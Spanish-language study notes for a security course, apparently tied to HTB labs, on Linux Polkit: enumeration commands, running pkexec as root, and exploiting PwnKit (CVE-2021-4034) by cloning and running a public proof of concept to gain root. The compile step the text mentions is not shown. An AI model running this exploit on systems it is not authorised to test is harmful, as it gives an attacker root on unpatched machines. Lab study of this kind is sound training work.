
**Polkit** es un servicio de autorización de Linux que permite a los usuarios y aplicaciones realizar operaciones privilegiadas.

## 1. Enumeración

Comprobar la versión de `pkexec`:

```
pkexec --version
```

Comprobar los permisos del binario:

```
ls -l /usr/bin/pkexec
```

Consultar las acciones disponibles:

```
pkaction
```

Comprobar las reglas de Polkit:

```
ls -la /etc/polkit-1/
ls -la /usr/share/polkit-1/
```

## 2. Uso de pkexec

`pkexec` permite ejecutar un comando con los privilegios de otro usuario.

```
pkexec -u root id
```

Si la política de autorización lo permite, el comando se ejecutará como root.

## 3. PwnKit — CVE-2021-4034

**PwnKit** es una vulnerabilidad de escalada de privilegios en `pkexec` que puede permitir a un usuario local obtener privilegios de root en sistemas vulnerables.

### Comprobar el sistema

Identifica la distribución y versión:

```
cat /etc/os-release
```

Comprueba la versión del paquete:

```
pkexec --version
```

La versión por sí sola no confirma si el sistema es vulnerable; comprueba también si el paquete tiene el parche de seguridad correspondiente.

### Explotación en un laboratorio

HTB muestra una prueba de concepto en C que se compila en el sistema objetivo:

```
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034

./poc
```

Después, comprueba los privilegios:

```
id
```

Si la explotación tiene éxito, el resultado mostrará `uid=0(root)`.

## Puntos clave para el examen

- `pkexec` permite ejecutar programas con los privilegios de otro usuario.
    
- `pkaction` permite consultar las acciones de Polkit.
    
- `pkcheck` comprueba si un proceso está autorizado para una acción.
    
- **PwnKit (**`**CVE-2021-4034**`**)** es una vulnerabilidad de escalada de privilegios local asociada a `pkexec`.
    
- No todos los sistemas con `pkexec` instalado son vulnerables: comprueba los parches y la versión del paquete.
